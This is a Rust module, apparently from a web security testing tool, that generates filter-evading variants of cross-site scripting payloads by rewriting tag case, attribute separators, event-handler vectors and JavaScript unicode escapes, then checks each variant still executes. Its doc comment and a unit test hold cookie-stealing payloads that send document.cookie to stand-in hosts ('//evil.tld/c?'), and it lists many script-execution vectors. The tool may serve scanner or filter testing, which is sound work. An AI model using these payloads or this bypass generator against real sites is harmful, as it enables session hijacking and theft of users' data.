//! XSS payload-string equivalence + the joint `(payload × delivery)`
//! generator — the XSS arm of Phase B.
//!
//! Same contract as the SQL generator: every rewrite is
//! browser-parser-equivalent *by construction* and every emitted
//! member is re-verified ([`still_executes_xss`]) to still execute the
//! original script. Reuses the class-agnostic delivery algebra and the
//! `is_structured_xss` chokepoint so a real exfil
//! (`<img src=x onerror=fetch('//evil/'+document.cookie)>`) is never
//! degraded to a canned `alert(1)`.

use super::{DeliveryShape, Dialect, EquivConfig, EquivPayload, Rng};
use crate::grammar::xss::is_structured_xss;

/// HTML "before/after attribute name" separators — all parsed
/// identically by the HTML tokenizer. `/` is a legal attribute
/// separator (`<svg/onload=…>` ≡ `<svg onload=…>`).
const HTML_WS: &[&str] = &[
    " ", "\t", "\n", "\x0c", "\r", "/", "//", " / ", "\t", "\n/", " \t ", "/ ",
];

fn ws_pick(rng: &mut Rng) -> String {
    (*rng.pick(HTML_WS)).to_string()
}

// ── soundness ──────────────────────────────────────────────────────

/// Lowercased, HTML-entity-`&#xNN;`/`&#NN;`-decoded copy — what the
/// browser effectively sees, so entity-evasions normalise back.
fn normalize(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let b: Vec<char> = s.chars().collect();
    let mut i = 0;
    while i < b.len() {
        if b[i] == '&' && i + 2 < b.len() && b[i + 1] == '#' {
            let mut j = i + 2;
            let hex = b[j] == 'x' || b[j] == 'X';
            if hex {
                j += 1;
            }
            let st = j;
            while j < b.len() && b[j].is_ascii_alphanumeric() {
                j += 1;
            }
            let digits: String = b[st..j].iter().collect();
            let code = if hex {
                u32::from_str_radix(&digits, 16).ok()
            } else {
                digits.parse::<u32>().ok()
            };
            if let Some(c) = code.and_then(char::from_u32) {
                out.push(c.to_ascii_lowercase());
                if j < b.len() && b[j] == ';' {
                    j += 1;
                }
                i = j;
                continue;
            }
        }
        // JS \uXXXX escape → its char (identifier/string equivalent).
        if b[i] == '\\' && i + 5 < b.len() && b[i + 1] == 'u' {
            let digits: String = b[i + 2..i + 6].iter().collect();
            if let Some(c) = u32::from_str_radix(&digits, 16)
                .ok()
                .and_then(char::from_u32)
            {
                out.push(c.to_ascii_lowercase());
                i += 6;
                continue;
            }
        }
        out.push(b[i].to_ascii_lowercase());
        i += 1;
    }
    out
}

/// The attack's class-defining JS tokens: the exfil host + technique
/// markers + significant identifiers of the original.
fn markers(payload: &str) -> Vec<String> {
    let lc = normalize(payload);
    let mut m: Vec<String> = Vec::new();
    const TECH: &[&str] = &[
        "document.cookie",
        "localstorage",
        "sessionstorage",
        "fetch(",
        "xmlhttprequest",
        "sendbeacon",
        "websocket",
        "new image",
        "import(",
        "atob(",
        "eval(name",
        "eval(window.name",
        "navigator.credentials",
    ];
    for t in TECH {
        if lc.contains(t) {
            m.push((*t).to_string());
        }
    }
    // exfil host (after // or scheme://)
    let bs = lc.as_bytes();
    let mut i = 0;
    while i + 1 < bs.len() {
        if bs[i] == b'/' && bs[i + 1] == b'/' {
            let mut j = i + 2;
            while j < bs.len() && (bs[j].is_ascii_alphanumeric() || bs[j] == b'.' || bs[j] == b'-')
            {
                j += 1;
            }
            let host = lc[i + 2..j].trim_matches('.');
            if host.len() >= 4 && host.contains('.') {
                m.push(host.to_string());
            }
            i = j.max(i + 2);
        } else {
            i += 1;
        }
    }
    m.sort();
    m.dedup();
    m
}

fn has_exec_context(lc: &str) -> bool {
    lc.contains("javascript:")
        || lc.contains("<script")
        || lc.contains("srcdoc")
        || (lc.contains('<') && {
            // a tag carrying an on<handler>= attribute
            let bs = lc.as_bytes();
            let mut k = 0;
            let mut found = false;
            while k + 3 < bs.len() {
                if bs[k] == b'o'
                    && bs[k + 1] == b'n'
                    && bs[k + 2].is_ascii_alphabetic()
                    && (k == 0 || !bs[k - 1].is_ascii_alphabetic())
                {
                    let mut e = k + 2;
                    while e < bs.len() && bs[e].is_ascii_alphabetic() {
                        e += 1;
                    }
                    if e < bs.len() && (bs[e] == b'=' || bs[e].is_ascii_whitespace()) {
                        found = true;
                        break;
                    }
                }
                k += 1;
            }
            found
        })
}

/// True iff `cand` provably still executes the original script.
#[must_use]
pub fn still_executes_xss(original: &str, cand: &str) -> bool {
    if cand.trim().is_empty() {
        return false;
    }
    let lc = normalize(cand);
    if !has_exec_context(&lc) {
        return false;
    }
    if is_structured_xss(original) {
        let want = markers(original);
        if want.is_empty() {
            return true;
        }
        want.iter().all(|t| lc.contains(t.as_str()))
    } else {
        // PoC: a demonstrator sink must remain in the exec context.
        lc.contains("alert")
            || lc.contains("confirm")
            || lc.contains("prompt")
            || lc.contains("eval(")
            || lc.contains("print(")
    }
}

// ── JS body extraction (reused shape) ───────────────────────────────
fn extract_js_body(payload: &str) -> Option<String> {
    let bytes = payload.as_bytes();
    let lb = payload.to_ascii_lowercase().into_bytes();
    // first inline event handler value
    let mut k = 0;
    while k + 2 < lb.len() {
        if lb[k] == b'o'
            && lb[k + 1] == b'n'
            && lb[k + 2].is_ascii_alphabetic()
            && (k == 0 || !lb[k - 1].is_ascii_alphabetic())
        {
            let mut e = k + 2;
            while e < lb.len() && lb[e].is_ascii_alphabetic() {
                e += 1;
            }
            let mut p = e;
            while p < lb.len() && lb[p].is_ascii_whitespace() {
                p += 1;
            }
            if p < lb.len() && lb[p] == b'=' {
                p += 1;
                while p < lb.len() && lb[p].is_ascii_whitespace() {
                    p += 1;
                }
                if p < bytes.len() && (bytes[p] == b'"' || bytes[p] == b'\'') {
                    let q = bytes[p];
                    let st = p + 1;
                    let mut en = st;
                    while en < bytes.len() && bytes[en] != q {
                        en += 1;
                    }
                    let v = payload[st..en].trim();
                    if !v.is_empty() {
                        return Some(v.to_string());
                    }
                } else {
                    let st = p;
                    let mut en = st;
                    while en < bytes.len() && bytes[en] != b'>' {
                        en += 1;
                    }
                    let v = payload[st..en].trim();
                    if !v.is_empty() {
                        return Some(v.to_string());
                    }
                }
            }
        }
        k += 1;
    }
    let lc = payload.to_ascii_lowercase();
    if let Some(pos) = lc.find("javascript:") {
        let rest = &payload[pos + "javascript:".len()..];
        let end = rest.find(['"', '\'', '>']).unwrap_or(rest.len());
        let v = rest[..end].trim();
        if !v.is_empty() {
            return Some(v.to_string());
        }
    }
    if let Some(o) = lc.find("<script")
        && let Some(gt) = lc[o..].find('>')
    {
        let s = o + gt + 1;
        let e = lc[s..].find("</script").map_or(lc.len(), |x| s + x);
        let v = payload[s..e].trim();
        if !v.is_empty() {
            return Some(v.to_string());
        }
    }
    None
}

// ── rewrites ───────────────────────────────────────────────────────

/// Re-case ASCII letters of tag names and `on*` handler attribute
/// names (HTML is case-insensitive there). Never touches the JS body.
fn rw_case(s: &str, rng: &mut Rng) -> String {
    let b: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < b.len() {
        // tag name after '<' (optionally with '/')
        if b[i] == '<' {
            out.push('<');
            i += 1;
            if i < b.len() && b[i] == '/' {
                out.push('/');
                i += 1;
            }
            while i < b.len() && (b[i].is_ascii_alphanumeric() || b[i] == '-') {
                out.push(if rng.chance(1, 2) {
                    b[i].to_ascii_uppercase()
                } else {
                    b[i].to_ascii_lowercase()
                });
                i += 1;
            }
            continue;
        }
        // on<handler> attribute name (letters then '=' or ws)
        if (b[i] == 'o' || b[i] == 'O')
            && i + 1 < b.len()
            && (b[i + 1] == 'n' || b[i + 1] == 'N')
            && i + 2 < b.len()
            && b[i + 2].is_ascii_alphabetic()
            && (i == 0 || !b[i - 1].is_ascii_alphanumeric())
        {
            let mut e = i + 2;
            while e < b.len() && b[e].is_ascii_alphabetic() {
                e += 1;
            }
            if e < b.len() && (b[e] == '=' || b[e].is_whitespace()) {
                for &c in &b[i..e] {
                    out.push(if rng.chance(1, 2) {
                        c.to_ascii_uppercase()
                    } else {
                        c.to_ascii_lowercase()
                    });
                }
                i = e;
                continue;
            }
        }
        out.push(b[i]);
        i += 1;
    }
    out
}

/// Replace the whitespace run immediately after a tag name with an
/// HTML-equivalent separator (incl. the `/` form). Sound: those bytes
/// are all "before attribute name" separators.
fn rw_intratag_ws(s: &str, rng: &mut Rng) -> String {
    let b: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len() + 4);
    let mut i = 0;
    while i < b.len() {
        out.push(b[i]);
        if b[i] == '<' && i + 1 < b.len() && b[i + 1].is_ascii_alphabetic() {
            // copy tag name
            i += 1;
            while i < b.len() && (b[i].is_ascii_alphanumeric() || b[i] == '-') {
                out.push(b[i]);
                i += 1;
            }
            // collapse the following separator run → equivalent
            if i < b.len() && (b[i].is_whitespace() || b[i] == '/') {
                while i < b.len() && (b[i].is_whitespace() || b[i] == '/') {
                    i += 1;
                }
                out.push_str(&ws_pick(rng));
            }
            continue;
        }
        i += 1;
    }
    out
}

/// Re-template the original JS body into an equivalent exec vector
/// (all run the SAME script). The structured-preservation guarantee:
/// BODY is carried verbatim, so the chokepoint always passes.
fn rw_handler_synonym(payload: &str, rng: &mut Rng) -> Option<String> {
    let body = extract_js_body(payload)?;
    if body.contains('<') {
        return None; // not cleanly re-nestable
    }
    // The handler value MUST be quoted with a quote char absent from
    // the body — an UNQUOTED handler breaks on the first space/`>` in
    // the JS, producing a malformed tag that never executes (the
    // verifier substring-matches markers and would wrongly accept it).
    let q = if !body.contains('"') {
        '"'
    } else if !body.contains('\'') {
        '\''
    } else {
        return None;
    };
    let qb = format!("{q}{body}{q}");
    let mut pool: Vec<String> = [
        "<svg onload={V}>",
        "<svg/onload={V}>",
        "<img src=x onerror={V}>",
        "<body onload={V}>",
        "<details open ontoggle={V}>",
        "<marquee onstart={V}>",
        "<video><source onerror={V}>",
        "<input autofocus onfocus={V}>",
        "<select autofocus onfocus={V}></select>",
    ]
    .iter()
    .map(|t| t.replace("{V}", &qb))
    .collect();
    // URL-scheme form: the whole tail is the JS, no attribute quoting.
    pool.push(format!("javascript:{body}"));
    // srcdoc: only when `"` is free for the inner handler and `'`
    // wraps the attribute (otherwise the nested quoting collides).
    if q == '"' && !body.contains('\'') {
        pool.push(format!("<iframe srcdoc='<svg onload=\"{body}\">'>"));
    }
    Some(rng.pick(&pool).clone())
}

/// JS-equivalent: escape one leading identifier letter of a sink as a
/// `\uXXXX` escape (`alert(` → `alert(`). Identical at JS parse.
fn rw_js_unicode(s: &str, rng: &mut Rng) -> Option<String> {
    for name in ["alert", "confirm", "prompt", "eval", "fetch", "print"] {
        if let Some(pos) = s.find(name) {
            // only inside an exec context, before a '('
            let after = &s[pos + name.len()..];
            if !after.trim_start().starts_with('(') {
                continue;
            }
            // F91: was `chance(1, 1)` — that's always-true (`x % 1 < 1`
            // ⇒ 0 < 1), so the `continue` was dead and the function
            // emitted the escape on the first sink-name match
            // regardless of seed. That collapsed bypass diversity and
            // made the equivalence class deterministic where the rest
            // of the rewriter pool deliberately samples. Match the
            // 50/50 cadence the other gates in this file use.
            if !rng.chance(1, 2) {
                continue;
            }
            let first = name.as_bytes()[0];
            let esc = format!("\\u{:04x}", u32::from(first));
            let mut out = String::with_capacity(s.len() + 5);
            out.push_str(&s[..pos]);
            out.push_str(&esc);
            out.push_str(&s[pos + 1..]);
            return Some(out);
        }
    }
    None
}

// ── generator ──────────────────────────────────────────────────────

/// Draw up to `cfg.max` members of the joint XSS equivalence class.
/// Deterministic per `cfg.seed`; every member structurally verified.
#[must_use]
pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    let mut rng = Rng::new(cfg.seed);
    let all = super::sql::delivery_set(&cfg.param);
    let (deliveries, single_forced) = match cfg.force_delivery {
        Some(i) if i < all.len() => (vec![all[i].clone()], true),
        _ => (all, false),
    };
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut out: Vec<EquivPayload> = Vec::new();

    if !still_executes_xss(payload, payload) {
        return out;
    }

    // Seed 1: identity script across every delivery shape.
    for d in &deliveries {
        if !cfg.vary_delivery && !single_forced && !matches!(d, DeliveryShape::Query { .. }) {
            continue;
        }
        // Delivery-axis anti-rig: never pair a payload with a raw
        // channel it cannot occupy without forging transport structure.
        if !d.transport_legal(payload) {
            continue;
        }
        let key = format!("{}\u{1}{}", payload, d.label());
        if seen.insert(key) {
            out.push(EquivPayload {
                payload: payload.to_string(),
                delivery: d.clone(),
                dialect: Dialect::Generic,
                rules: vec!["identity"],
            });
        }
    }

    // Seed 2: sampled browser-equivalent rewrites × delivery.
    let mut attempts = 0;
    while out.len() < cfg.max && attempts < cfg.max * 24 + 64 {
        attempts += 1;
        let mut s = payload.to_string();
        let mut rules: Vec<&'static str> = Vec::new();

        if rng.chance(3, 5)
            && let Some(h) = rw_handler_synonym(&s, &mut rng)
        {
            s = h;
            rules.push("handler_synonym");
        }
        if rng.chance(4, 5) {
            let c = rw_case(&s, &mut rng);
            if c != s {
                s = c;
                rules.push("tag_attr_case");
            }
        }
        if rng.chance(3, 5) {
            let w = rw_intratag_ws(&s, &mut rng);
            if w != s {
                s = w;
                rules.push("intratag_ws");
            }
        }
        if rng.chance(2, 5)
            && let Some(u) = rw_js_unicode(&s, &mut rng)
        {
            s = u;
            rules.push("js_unicode_escape");
        }
        if rules.is_empty() {
            continue;
        }
        if !still_executes_xss(payload, &s) {
            continue; // sound-by-construction AND verified
        }
        let d = if cfg.vary_delivery || single_forced {
            rng.pick(&deliveries).clone()
        } else {
            DeliveryShape::Query {
                param: cfg.param.clone(),
            }
        };
        // Skip (don't silently re-route — that would bias the delivery
        // distribution) when this rewrite cannot legally occupy the
        // sampled raw channel. The attempts budget absorbs the misses.
        if !d.transport_legal(&s) {
            continue;
        }
        let key = format!("{s}\u{1}{}", d.label());
        if !seen.insert(key) {
            continue;
        }
        out.push(EquivPayload {
            payload: s,
            delivery: d,
            dialect: Dialect::Generic,
            rules,
        });
    }
    // Inline `transport_legal` guards above already prevent illegal
    // pairings (re-sampling preserves recall); this is the uniform
    // belt-and-suspenders shared by every class.
    super::enforce_transport_legal(&mut out);
    out.truncate(cfg.max);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(seed: u64) -> EquivConfig {
        EquivConfig {
            seed,
            max: 48,
            verify: true,
            vary_delivery: true,
            param: "q".into(),
            force_delivery: None,
        }
    }

    #[test]
    fn structured_exfil_is_never_degraded() {
        let atk = "<img src=x onerror=fetch('//evil.tld/c?'+document.cookie)>";
        let v = generate(atk, &cfg(7));
        assert!(!v.is_empty());
        for m in &v {
            assert!(
                still_executes_xss(atk, &m.payload),
                "unsound member {:?}",
                m.payload
            );
            let lc = normalize(&m.payload);
            assert!(
                lc.contains("document.cookie") && lc.contains("fetch(") && lc.contains("evil.tld"),
                "exfil construct lost: {:?}",
                m.payload
            );
        }
    }

    #[test]
    fn rewrites_are_browser_equivalent_and_diverse() {
        let atk = "<svg onload=alert(1)>";
        let v = generate(atk, &cfg(3));
        let distinct: std::collections::HashSet<_> = v.iter().map(|m| &m.payload).collect();
        assert!(distinct.len() >= 6, "too few distinct equivalents");
        for m in &v {
            assert!(still_executes_xss(atk, &m.payload));
        }
        // case + ws variants must appear
        assert!(
            v.iter().any(|m| m.rules.contains(&"tag_attr_case")),
            "no case variant"
        );
    }

    #[test]
    fn unicode_escape_normalizes_back_to_the_sink() {
        // alert ≡ alert at JS parse — normaliser must fold it.
        assert!(normalize("\\u0061lert(1)").contains("alert(1)"));
        assert!(still_executes_xss(
            "<svg onload=alert(1)>",
            "<svg onload=\\u0061lert(1)>"
        ));
    }

    #[test]
    fn entity_encoded_handler_normalizes() {
        assert!(normalize("&#x61;&#x6c;ert").contains("alert"));
    }

    #[test]
    fn non_xss_and_empty_emit_nothing() {
        assert!(generate("hello world", &cfg(1)).is_empty());
        assert!(generate("", &cfg(1)).is_empty());
        assert!(generate("just text alert", &cfg(1)).is_empty());
    }

    #[test]
    fn deterministic_per_seed() {
        let a: Vec<_> = generate("<svg onload=alert(1)>", &cfg(9))
            .into_iter()
            .map(|m| (m.payload, m.delivery.label()))
            .collect();
        let b: Vec<_> = generate("<svg onload=alert(1)>", &cfg(9))
            .into_iter()
            .map(|m| (m.payload, m.delivery.label()))
            .collect();
        assert_eq!(a, b);
    }

    #[test]
    fn force_delivery_restricts_shape() {
        let mut c = cfg(2);
        c.force_delivery = Some(1); // path_segment
        for m in generate("<svg onload=alert(1)>", &c) {
            assert_eq!(m.delivery.label(), "path_segment");
        }
    }
}
